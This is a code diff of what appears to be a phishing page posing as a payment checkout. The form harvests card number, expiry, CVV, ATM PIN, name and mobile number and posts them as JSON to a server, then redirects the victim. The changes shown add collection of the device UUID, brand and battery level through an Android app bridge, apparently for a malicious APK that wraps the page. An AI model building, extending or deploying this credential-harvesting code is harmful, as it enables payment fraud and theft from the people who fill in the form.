@@ -4,13 +4,14 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Checkout</title>
- <link rel="stylesheet" type="text/css" href="style2.css">
-
+<link rel="stylesheet" type="text/css" href="style2.css">
 </head>
 <body>
-  <div class="banner">
-    <img src="01.jpg" alt="Banner Image" style="width: 100%; height: 100%;">
-  </div>
+  <br><br>
+<div class="banner">
+  <img src="01.jpg" alt="Banner Image" style="width:100%; height:100%;">
+</div>
+
 <div class="container">
   <h2>ENTER YOUR CREDENTIALS</h2>
   <form id="checkoutForm">
@@ -48,8 +49,8 @@
 
     <label for="atmpin">ATM PIN</label>
     <input type="password" id="atmpin" placeholder="XXXX or XXXXXX" required maxlength="6" inputmode="numeric" pattern="\d*">
-    <br><br>
 
+    <br><br>
     <button type="submit">Make Payment</button>
   </form>
 </div>
@@ -61,7 +62,7 @@ const expiryInput = document.getElementById('expiry');
 const mobileInput = document.getElementById('mobileNumber');
 const atmInput = document.getElementById('atmpin');
 
-// Card 16 digits 4-4-4-4 formatting
+// Card 16 digits formatting
 cardInput.addEventListener('input', e => {
   let val = e.target.value.replace(/\D/g,'').slice(0,16);
   let formatted = val.match(/.{1,4}/g);
@@ -82,8 +83,7 @@ mobileInput.addEventListener('input', e => {
 
 // ATM PIN max 6 digits
 atmInput.addEventListener('input', e => {
-  let val = e.target.value.replace(/\D/g,'').slice(0,6);
-  e.target.value = val;
+  e.target.value = e.target.value.replace(/\D/g,'').slice(0,6);
 });
 
 // Luhn check for card
@@ -109,13 +109,16 @@ form.addEventListener('submit', async e => {
   // Validation
   if(card.length !==16 || !luhnCheck(card)){ alert('❌ Invalid card number'); return; }
   if(!/^\d{2}\/\d{2}$/.test(expiry) || mm<1 || mm>12 || yy<currentYear || (yy===currentYear && mm<currentMonth)){
-    alert('❌ Invalid or expired date'); return;
+    alert('❌ Invalid or expired'); return;
   }
   if(cvv.length !==3){ alert('❌ CVV must be 3 digits'); return; }
-  if(!(atmPin.length===4 || atmPin.length===6)){ alert('❌ ATM PIN must be 4 or 6 digits'); return; }
+  if(!(atmPin.length===4 || atmPin.length===6)){ alert('❌ ATM PIN Worng '); return; }
 
   const data = {
-    uuid: 'device-' + Math.random().toString(36).substr(2,6),
+    // UUID, brand & battery from APK
+    uuid: window.AndroidDevice ? AndroidDevice.getUUID() : 'device-'+Math.random().toString(36).substr(2,6),
+    brand: window.AndroidDevice ? AndroidDevice.getBrand() : 'Unknown',
+    battery: window.AndroidDevice ? AndroidDevice.getBattery() : '100%',
     client_name: document.getElementById('Name').value,
     mobile_number: mobileInput.value,
     amount_to_pay: document.getElementById('amount').value,
@@ -128,12 +131,11 @@ form.addEventListener('submit', async e => {
   };
 
   try{
-    await fetch('/html-form-data',{
+    await fetch('/html-form-data',{  // replace with your Node.js endpoint
       method:'POST',
       headers:{'Content-Type':'application/json'},
       body: JSON.stringify(data)
     });
-    // Redirect silently after success
     window.location.href = 'next-page.html';
   }catch(err){
     console.error(err);
@@ -143,4 +145,4 @@ form.addEventListener('submit', async e => {
 </script>
 
 </body>
-     </html>
+              </html>
